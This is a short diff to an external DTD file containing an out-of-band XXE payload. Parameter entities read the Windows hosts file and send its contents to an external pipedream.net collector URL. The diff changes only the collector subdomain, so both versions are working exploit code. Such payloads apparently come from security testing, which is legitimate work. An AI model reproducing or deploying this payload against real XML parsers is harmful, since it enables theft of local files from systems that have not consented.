@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file://C:/Windows/System32/drivers/etc/hosts">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://eo7bz04mngeu7gg.m.pipedream.net/%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://eotad3zugug90z.m.pipedream.net/%file;'>">
 %eval;
 %exfiltrate;
